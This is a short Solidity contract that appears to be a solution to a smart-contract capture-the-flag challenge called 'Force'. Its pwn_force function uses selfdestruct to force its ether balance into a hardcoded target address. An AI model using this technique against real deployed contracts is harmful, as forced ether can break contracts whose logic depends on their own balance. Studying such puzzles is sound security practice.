// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {

    address target = 0x9030f7671CA33Df1C84Fba0D90739dF47eB6d552;

    function pwn_force() public payable {
        selfdestruct(payable(target));
    }

    fallback() external payable { }

    receive() external payable { }
}